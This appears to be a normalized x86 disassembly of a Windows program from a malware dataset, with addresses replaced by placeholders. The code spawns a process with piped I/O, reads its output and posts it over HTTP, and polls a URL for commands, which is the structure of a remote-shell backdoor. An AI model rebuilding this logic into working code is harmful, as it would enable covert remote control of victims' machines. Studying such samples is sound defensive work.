cmp cl bl
jne r-xdata
push 0x2f
push rw-data
call sub_4043a0
mov [ eax ] bl
mov ecx 0x6
mov esi r--data
mov edi rw-data
[ edi ] [ esi ]
add esp 0x8
push 0x100
lea eax [ esp + 0x3d4 ]
push eax
movsb [ edi ] [ esi ]
call [ GetSystemDirectoryA@IAT ]
lea eax [ esp + 0x3d0 ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov cl [ r--data ]
mov [ eax + 0x4 ] edx
push ebx
mov [ eax + 0x8 ] cl
mov [ esp + 0x30 ] 0xc
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] 0x1
mov [ esp + 0x24 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
call sub_4056bd
add esp 0x4
push eax
call sub_40509d
add esp 0x4
push 0x14
call sub_404572
mov [ rw-data ] eax
xor ecx ecx
mov [ eax ] ecx
mov edx [ rw-data ]
mov [ edx + 0x4 ] ecx
mov eax [ rw-data ]
add esp 0x4
mov [ eax + 0x8 ] cx
call sub_4050af
xor esi esi
call sub_4050af
cdq
mov ecx 0x19
idiv ecx
mov eax [ rw-data ]
inc esi
add edx 0x61
mov [ esi + eax - 0x1 ] dl
cmp esi 0x8
jl r-xdata
mov ecx [ rw-data ]
mov [ ecx + 0x8 ] bl
mov eax [ rw-data ]
lea edx [ esp + 0x4d0 ]
sub edx eax
lea ebx [ ebx ]
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ esp + 0x4d0 ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov edx [ r--data ]
mov cx [ r--data ]
mov [ eax ] edx
mov [ eax + 0x4 ] cx
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ esp + 0x20 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ esp + 0x14 ]
push ecx
call esi
mov edx [ esp + 0x18 ]
push edx
call esi
mov eax [ esp + 0x1c ]
push eax
call esi
lea esp [ esp ]
lea edx [ esp + 0x198 ]
push 0x12c
push edx
call sub_4032a0
mov esi eax
add esp 0x8
cmp esi ebx
jle r-xdata
mov esi [ Sleep@IAT ]
push 0x104
lea eax [ esp + 0x2cc ]
push ebx
push eax
call sub_40aef0
add esp 0xc
push esi
push r--data
lea ecx [ esp + 0x2d0 ]
push 0x104
push ecx
call sub_404cb7
lea eax [ esp + 0x2d8 ]
add esp 0x10
lea edx [ eax + 0x1 ]
mov ecx r--data
lea eax [ esp + 0x19d ]
nop
mov ecx r--data
lea eax [ esp + 0x1a5 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push 0x4d
push eax
lea edx [ esp + 0x2d0 ]
push edx
call sub_402f80
mov esi [ Sleep@IAT ]
add esp 0xc
push 0x1388
call esi
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp dl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp dl bl
je r-xdata
mov eax [ rw-data ]
push 0x8
push eax
lea ecx [ esp + 0x1a5 ]
push ecx
call sub_404a11
add esp 0xc
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push 0x4d
push 0x8
push r--data
call sub_402f80
mov esi [ CreatePipe@IAT ]
add esp 0xc
push ebx
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x2c ]
push eax
call esi
push ebx
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x24 ]
push eax
call esi
lea ecx [ esp + 0x48 ]
push ecx
mov [ esp + 0x4c ] 0x44
call [ GetStartupInfoA@IAT ]
mov eax [ esp + 0x18 ]
mov esi [ CreateProcessA@IAT ]
xor edx edx
lea ecx [ esp + 0x38 ]
push ecx
mov [ esp + 0x7c ] dx
lea edx [ esp + 0x4c ]
push edx
push ebx
push ebx
push ebx
push 0x1
push ebx
mov [ esp + 0x9c ] eax
mov eax [ esp + 0x30 ]
push ebx
mov [ esp + 0xa8 ] eax
mov [ esp + 0xa4 ] eax
push r--data
lea eax [ esp + 0x3f4 ]
push eax
mov [ esp + 0x9c ] 0x101
call esi
test eax eax
jne r-xdata
mov ecx r--data
lea eax [ esp + 0x1a5 ]
lea esp [ esp ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
sub eax edx
push 0x48
push eax
lea eax [ esp + 0x4d8 ]
push eax
call sub_402f80
add edi 0x3e8
add esp 0xc
cmp edi 0xfde8
jg r-xdata
sub eax edx
push 0x48
push eax
lea edx [ esp + 0x4d8 ]
push edx
call sub_402f80
add esp 0xc
push edi
call esi
add edi 0x3e8
cmp edi 0xea60
jl r-xdata
cmp eax ebx
lea eax [ esp + 0x4d0 ]
lea edx [ eax + 0x1 ]
jne r-xdata
add eax 0x2
add ecx 0x2
cmp dl bl
jne r-xdata
mov edi [ CreateThread@IAT ]
push ebx
push ebx
lea ecx [ esp + 0x28 ]
push ecx
push sub_402550
push ebx
push ebx
call edi
push ebx
push ebx
lea edx [ esp + 0x24 ]
push edx
push sub_4028f0
push ebx
push ebx
mov esi eax
call edi
push 0xffffffff
mov edi eax
push ebx
lea eax [ esp + 0x2c ]
push eax
push 0x2
mov [ esp + 0x34 ] esi
mov [ esp + 0x38 ] edi
call [ WaitForMultipleObjects@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push esi
call [ GetExitCodeThread@IAT ]
mov edx [ esp + 0x10 ]
push edx
push esi
mov esi [ TerminateThread@IAT ]
call esi
lea eax [ esp + 0x10 ]
push eax
push edi
call [ GetExitCodeThread@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
push edi
call esi
mov eax [ esp + 0x38 ]
lea edx [ esp + 0x10 ]
push edx
push eax
call [ GetExitCodeProcess@IAT ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x38 ]
push ecx
push edx
call [ TerminateProcess@IAT ]
cmp [ rw-data ] ebx
je r-xdata
push 0x104
lea ecx [ esp + 0x94 ]
push ebx
push ecx
call sub_40aef0
mov edi [ GetLastError@IAT ]
add esp 0xc
call edi
push eax
push r--data
lea edx [ esp + 0x98 ]
push 0x104
push edx
call sub_404cb7
lea eax [ esp + 0xa0 ]
add esp 0x10
lea edx [ eax + 0x1 ]
sbb eax eax
sbb eax 0xffffffff
cmp dl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add ecx 0x2
cmp dl bl
jne r-xdata
call sub_404090
mov ecx [ esp + 0x85c ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_4042ed
mov esp ebp
pop ebp
retn 0x10
push 0xea60
call esi
jmp r-xdata
jmp r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov edi 0x1388
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push 0x4d
push eax
lea eax [ esp + 0x98 ]
push eax
call sub_402f80
add esp 0xc
lea ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x4c ]
push edx
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
lea eax [ esp + 0x3f0 ]
push eax
push ebx
call esi
test eax eax
je r-xdata
mov ecx r--data
lea eax [ esp + 0x1a5 ]
push 0xea60
call esi
add edi 0x3e8
cmp edi 0xfde8
jl r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
push 0x104
lea eax [ esp + 0x94 ]
push ebx
push eax
call sub_40aef0
add esp 0xc
call edi
push eax
push r--data
lea ecx [ esp + 0x98 ]
push 0x104
push ecx
call sub_404cb7
lea eax [ esp + 0xa0 ]
add esp 0x10
lea edx [ eax + 0x1 ]
sbb eax eax
sbb eax 0xffffffff
cmp dl bl
je r-xdata
push 0x4d
push 0x5
push r--data
call sub_402f80
add esp 0xc
jmp r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add ecx 0x2
cmp dl bl
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push 0x4d
push eax
lea edx [ esp + 0x98 ]
push edx
call sub_402f80
add esp 0xc
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add ecx 0x2
cmp dl bl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_402550
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41095b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x1564
call sub_40dba0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1560 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1578 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x28 ] eax
xor ebx ebx
mov edi edi
call sub_4050af
cdq
mov ecx 0x1c2
idiv ecx
lea esi [ edx + 0x1c2 ]
xor edx edx
cmp esi 0x64
setge dl
dec edx
and edx 0x64
lea eax [ edx + esi + 0x3e8 ]
push eax
call [ Sleep@IAT ]
push 0x385
lea ecx [ esp + 0x2d0 ]
push ebx
push ecx
call sub_40aef0
add esp 0xc
push ebx
push ebx
lea edx [ esp + 0x28 ]
push edx
push esi
mov esi [ esp + 0x38 ]
mov ecx [ esi ]
lea eax [ esp + 0x2dc ]
push eax
push ecx
call [ PeekNamedPipe@IAT ]
mov eax [ esp + 0x20 ]
cmp eax ebx
je r-xdata
mov ecx [ esi ]
push ebx
lea edx [ esp + 0x24 ]
push edx
push eax
lea eax [ esp + 0x2d8 ]
push eax
push ecx
call [ ReadFile@IAT ]
mov eax [ esp + 0x20 ]
push ebx
push ebx
push ebx
push ebx
push rw-data
mov [ esp + eax + 0x2e0 ] bl
mov [ esp + 0x30 ] eax
call [ InternetOpenA@IAT ]
mov esi eax
mov [ esp + 0x24 ] esi
cmp esi ebx
je r-xdata
push 0x1
push ebx
push 0x3
push ebx
push ebx
push 0x50
push rw-data
push esi
call [ InternetConnectA@IAT ]
mov edi eax
mov [ esp + 0x30 ] edi
cmp edi ebx
jne r-xdata
push ebx
push 0x84400000
push ebx
push ebx
push ebx
push rw-data
push r--data
push edi
call [ HttpOpenRequestA@IAT ]
mov [ esp + 0x2c ] eax
cmp eax ebx
jne r-xdata
push esi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
mov ecx 0xc
mov esi r--data
lea edi [ esp + 0x29c ]
[ edi ] [ esi ]
mov esi [ rw-data ]
mov [ esp + 0x14 ] 0x4c706143
mov [ esp + 0x18 ] 0x65747369
cmp esi ebx
jne r-xdata
push edi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
push 0x385
push ebx
push esi
call sub_40aef0
add esp 0xc
cmp [ rw-data ] ebx
jne r-xdata
push 0x385
call sub_404572
mov esi eax
add esp 0x4
mov [ rw-data ] esi
mov edx [ rw-data ]
push 0xa8c
push ebx
push edx
call sub_40aef0
mov eax [ rw-data ]
add esp 0xc
cmp eax ebx
jne r-xdata
push 0xa8c
call sub_404572
add esp 0x4
mov [ rw-data ] eax
push 0xa8c
push ebx
push eax
call sub_40aef0
mov eax [ rw-data ]
add esp 0xc
cmp eax ebx
jne r-xdata
push 0xa8c
call sub_404572
add esp 0x4
mov [ rw-data ] eax
push 0xe10
push ebx
push eax
call sub_40aef0
mov edi [ esp + 0x28 ]
add esp 0xc
push edi
lea eax [ esp + 0x2d0 ]
push eax
lea ecx [ esi + 0x1 ]
push ecx
mov [ esi ] 0x4d
call sub_40af70
add esp 0xc
mov [ esp + 0x34 ] r--data
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x70 ] ebx
mov [ esp + 0x28c ] ebx
mov [ esp + 0x290 ] ebx
mov [ esp + 0x294 ] ebx
mov [ esp + 0x1580 ] ebx
mov edx [ rw-data ]
push edx
lea eax [ esp + 0x38 ]
mov [ esp + 0x20 ] esi
call sub_403e00
inc edi
xor esi esi
cmp edi ebx
jle r-xdata
push 0xe10
call sub_404572
add esp 0x4
mov [ rw-data ] eax
lea eax [ esp + 0x34 ]
call sub_403ff0
mov edx [ esp + 0x44 ]
push edx
lea ecx [ esp + 0x18 ]
call sub_4018d0
add esp 0x4
push eax
call sub_401a70
add esp 0x4
push 0xf14
mov esi eax
lea eax [ esp + 0x658 ]
push ebx
push eax
call sub_40aef0
mov ecx [ rw-data ]
mov edx [ rw-data ]
add esp 0xc
push ecx
push esi
push 0x4d
push edx
push r--data
lea eax [ esp + 0x668 ]
push 0xf14
push eax
call sub_404cb7
lea eax [ esp + 0x670 ]
add esp 0x1c
lea edx [ eax + 0x1 ]
mov eax [ esp + 0x1c ]
movzx ecx [ esi + eax ]
push ecx
lea eax [ esp + 0x38 ]
call sub_403e90
inc esi
cmp esi edi
jl r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edx eax
lea eax [ esp + 0x29c ]
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
push edx
lea ecx [ esp + 0x658 ]
push ecx
sub eax esi
mov esi [ esp + 0x34 ]
push eax
lea edx [ esp + 0x2a8 ]
push edx
push esi
call [ HttpSendRequestA@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
mov eax [ esp + 0x30 ]
push eax
call esi
mov ecx [ esp + 0x24 ]
push ecx
call esi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x1580 ] 0xffffffff
call sub_403ce0
jmp r-xdata
sub_4028f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x6a4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x6a0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] 0xffffffff
mov esi 0x1
inc esi
cmp esi 0xd2
jl r-xdata
mov ecx r--data
lea eax [ esp + 0x365 ]
lea esp [ esp ]
mov eax 0x88888889
imul esi
add edx esi
sar edx 0x3
mov ecx edx
shr ecx 0x1f
lea edx [ edx + ecx + 0x1 ]
imul edx edx 0xfa0
push edx
call [ Sleep@IAT ]
lea eax [ esp + 0x360 ]
push 0x136
push eax
call sub_4032a0
add esp 0x8
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov ecx [ esp + 0x6ac ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_4042ed
mov esp ebp
pop ebp
retn 0x4
mov ecx [ rw-data ]
push 0x8
push ecx
lea edx [ esp + 0x36d ]
push edx
call sub_404a11
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov bl [ esp + 0x364 ]
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov cl [ esp + eax + 0x36d ]
mov [ esp + eax + 0x128 ] cl
inc eax
test cl cl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x364 ]
push r--data
push ecx
call sub_4049ef
add esp 0xc
mov ecx r--data
lea eax [ esp + 0x128 ]
lea esp [ esp ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov eax [ esp + 0x1c ]
cmp [ esp + 0xc ] eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor esi esi
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] esi
cmp bl 0x4d
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push 0x7
lea edx [ esp + 0x12c ]
push r--data
push edx
call sub_40492e
add esp 0xc
test eax eax
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
lea eax [ esp + 0x128 ]
lea edx [ eax + 0x1 ]
nop
push 0xa
lea eax [ esp + 0x12c ]
push r--data
push eax
call sub_40492e
add esp 0xc
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x4d
push eax
lea eax [ esp + 0x130 ]
push eax
call sub_402f80
add esp 0xc
push 0x7
lea ecx [ esp + 0x12c ]
push r--data
push ecx
xor ebx ebx
call sub_40492e
add esp 0xc
test eax eax
jne r-xdata
mov ecx r--data
lea eax [ esp + 0x128 ]
lea ecx [ esp + 0x5a0 ]
push ecx
lea edx [ esp + 0x12f ]
push r--data
push edx
call sub_4049ef
mov ebx 0x1
lea edx [ esp + 0x5a0 ]
push edx
lea eax [ esp + 0x12c ]
push r--data
push eax
call sub_4049ef
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
lea edx [ esp + 0x5a0 ]
push 0x2f
push edx
call sub_4052b0
add esp 0x8
mov esi eax
lea eax [ esp + 0x258 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea eax [ esi + 0x1 ]
mov ecx eax
lea esp [ esp ]
cmp [ esi ] 0x20
jne r-xdata
add esp 0xc
lea eax [ esp + 0x128 ]
push 0x20
push eax
call sub_4043a0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov ecx r--data
lea eax [ esp + 0x128 ]
push 0x4d
push 0x5
push r--data
call sub_402f80
mov ecx [ r--data ]
mov dl [ r--data ]
mov [ esp + 0x134 ] ecx
mov [ esp + 0x138 ] dl
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x258 ]
sub eax ecx
mov esi ecx
dec edi
push 0x5c
push esi
call sub_4043a0
add esp 0x8
test eax eax
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
add esp 0xc
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x258 ]
push ecx
push 0x104
call [ GetTempPathA@IAT ]
mov eax esi
mov ecx esi
lea ebx [ ebx ]
lea edx [ esp + 0x258 ]
mov eax esi
sub edx esi
cmp [ esp + 0x128 ] 0x21
jne r-xdata
mov eax [ r--data ]
mov cl [ r--data ]
push 0x4d
push 0x5
push r--data
mov [ esp + 0x134 ] eax
mov [ esp + 0x138 ] cl
call sub_402f80
mov [ rw-data ] 0x1
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
lea edi [ esp + 0x128 ]
dec edi
push 0x104
lea edx [ esp + 0x49c ]
push 0x0
push edx
call sub_40aef0
add esp 0xc
lea eax [ esp + 0x128 ]
push eax
push r--data
lea ecx [ esp + 0x4a0 ]
push 0x104
push ecx
call sub_404cb7
lea eax [ esp + 0x4a8 ]
add esp 0x10
lea edx [ eax + 0x1 ]
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] edx
mov edx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] eax
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x258 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov cx [ r--data ]
lea eax [ esp + 0x128 ]
mov [ edi ] cx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x4d
push eax
lea edx [ esp + 0x4a0 ]
push edx
call sub_402f80
add esp 0xc
push 0x0
push 0x0
lea eax [ esp + 0x131 ]
push eax
push sub_403a00
push 0x0
push 0x0
call [ CreateThread@IAT ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x4d
push eax
lea eax [ esp + 0x28 ]
push eax
call sub_402f80
mov edx [ esp + 0x1c ]
mov eax [ edx ]
add esp 0xc
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push 0x1
push r--data
push eax
call [ WriteFile@IAT ]
mov esi [ esp + 0x18 ]
lea eax [ esp + 0x20 ]
lea edx [ eax + 0x1 ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
lea ecx [ esp + 0x258 ]
push ebx
push ecx
lea ecx [ esp + 0x5a8 ]
call sub_403660
add esp 0x8
test eax eax
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x10 ]
sub eax edx
push 0x0
lea edx [ esp + 0x18 ]
push edx
mov edx [ ecx ]
push eax
lea eax [ esp + 0x134 ]
push eax
push edx
call [ WriteFile@IAT ]
mov ecx r--data
lea eax [ esp + 0x128 ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_402e90
push ebp
mov ebp esp
sub esp 0x314
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x108 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ ebp - 0x108 ]
push ecx
call [ LoadLibraryA@IAT ]
push 0x208
lea edx [ ebp - 0x310 ]
push edx
push 0x1
push eax
mov [ ebp - 0x314 ] eax
call [ LoadStringA@IAT ]
lea eax [ ebp - 0x310 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push ebx
sub eax edx
push esi
mov ebx eax
push edi
lea esi [ ebx + 0x1 ]
push esi
call sub_404572
push esi
mov edi eax
push 0x0
push edi
call sub_40aef0
lea eax [ ebp - 0x310 ]
add esp 0x10
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp ebx eax
jl r-xdata
mov eax [ ebp - 0x314 ]
push eax
call [ FreeLibrary@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4042ed
mov esp ebp
pop ebp
retn
push edi
lea eax [ ebp - 0x310 ]
call sub_404220
add esp 0x4
test eax eax
je r-xdata
push rw-data
push edi
mov eax 0x104
call sub_401c40
push edi
mov [ eax + rw-data ] 0x0
call sub_404538
add esp 0xc
sub_402f80
push ebp
mov ebp esp
push 0xffffffff
push sub_41091b
mov eax [ fs : 0x0 ]
push eax
mov eax 0x11d0
call sub_40dba0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push rw-data
mov [ ebp - 0x11d0 ] eax
call [ InternetOpenA@IAT ]
mov edi eax
mov [ ebp - 0x11d4 ] edi
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
push ebx
push 0x3
push ebx
push ebx
push 0x50
push rw-data
push edi
call [ InternetConnectA@IAT ]
mov esi eax
mov [ ebp - 0x11d8 ] esi
cmp esi ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
push ebx
push 0x84400000
push ebx
push ebx
push ebx
push rw-data
push r--data
push esi
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0x11dc ] eax
cmp eax ebx
jne r-xdata
push edi
call [ InternetCloseHandle@IAT ]
mov ecx 0xc
mov esi r--data
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
mov esi [ rw-data ]
mov [ ebp - 0x11cc ] 0x4c706143
mov [ ebp - 0x11c8 ] 0x65747369
cmp esi ebx
jne r-xdata
push esi
call [ InternetCloseHandle@IAT ]
xor eax eax
jmp r-xdata
push 0x385
push ebx
push esi
call sub_40aef0
add esp 0xc
cmp [ rw-data ] ebx
jne r-xdata
push 0x385
call sub_404572
mov esi eax
add esp 0x4
mov [ rw-data ] esi
mov ecx [ rw-data ]
push 0xa8c
push ebx
push ecx
call sub_40aef0
mov eax [ rw-data ]
add esp 0xc
cmp eax ebx
jne r-xdata
push 0xa8c
call sub_404572
add esp 0x4
mov [ rw-data ] eax
push 0xa8c
push ebx
push eax
call sub_40aef0
mov eax [ rw-data ]
add esp 0xc
cmp eax ebx
jne r-xdata
push 0xa8c
call sub_404572
add esp 0x4
mov [ rw-data ] eax
push 0xe10
push ebx
push eax
call sub_40aef0
mov edi [ ebp + 0xc ]
mov eax [ ebp - 0x11d0 ]
mov dl [ ebp + 0x10 ]
add esp 0xc
push edi
push eax
lea ecx [ esi + 0x1 ]
push ecx
mov [ esi ] dl
call sub_40af70
add esp 0xc
mov [ ebp - 0x11c4 ] r--data
mov [ ebp - 0x11b8 ] ebx
mov [ ebp - 0x11b4 ] ebx
mov [ ebp - 0x11bc ] ebx
mov [ ebp - 0x11c0 ] ebx
mov [ ebp - 0x1190 ] ebx
mov [ ebp - 0x118c ] ebx
mov [ ebp - 0x1188 ] ebx
mov [ ebp - 0xf6c ] ebx
mov [ ebp - 0xf68 ] ebx
mov [ ebp - 0xf64 ] ebx
mov [ ebp - 0x4 ] ebx
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x11c4 ]
mov [ ebp - 0x11d0 ] esi
call sub_403e00
inc edi
xor esi esi
cmp edi ebx
jle r-xdata
push 0xe10
call sub_404572
add esp 0x4
mov [ rw-data ] eax
lea eax [ ebp - 0x11c4 ]
call sub_403ff0
mov edx [ ebp - 0x11b4 ]
push edx
lea ecx [ ebp - 0x11cc ]
call sub_4018d0
add esp 0x4
push eax
call sub_401a70
add esp 0x4
push 0xf14
mov esi eax
lea eax [ ebp - 0xf5c ]
push ebx
push eax
call sub_40aef0
mov ecx [ rw-data ]
mov edx [ rw-data ]
add esp 0xc
push ecx
push esi
push 0x4d
push edx
push r--data
lea eax [ ebp - 0xf5c ]
push 0xf14
push eax
call sub_404cb7
lea eax [ ebp - 0xf5c ]
add esp 0x1c
lea edx [ eax + 0x1 ]
nop
mov eax [ ebp - 0x11d0 ]
movzx ecx [ esi + eax ]
push ecx
lea eax [ ebp - 0x11c4 ]
call sub_403e90
inc esi
cmp esi edi
jl r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edx eax
lea eax [ ebp - 0x44 ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
push edx
lea ecx [ ebp - 0xf5c ]
push ecx
sub eax esi
mov esi [ ebp - 0x11dc ]
push eax
lea edx [ ebp - 0x44 ]
push edx
push esi
call [ HttpSendRequestA@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
mov eax [ ebp - 0x11d8 ]
push eax
call esi
mov ecx [ ebp - 0x11d4 ]
push ecx
call esi
lea ecx [ ebp - 0x11c4 ]
call sub_403ce0
mov eax 0x1
sub_4032a0
push ebp
mov ebp esp
sub esp 0x518
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
mov [ ebp - 0x518 ] eax
call [ InternetOpenA@IAT ]
mov [ ebp - 0x510 ] eax
test eax eax
jne r-xdata
push 0x0
push 0x84000100
push 0x0
push 0x0
push rw-data
push eax
call [ InternetOpenUrlA@IAT ]
mov [ ebp - 0x514 ] eax
test eax eax
jne r-xdata
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea ecx [ ebp - 0x108 ]
push ecx
push 0x104
call [ GetTempPathA@IAT ]
push 0xa
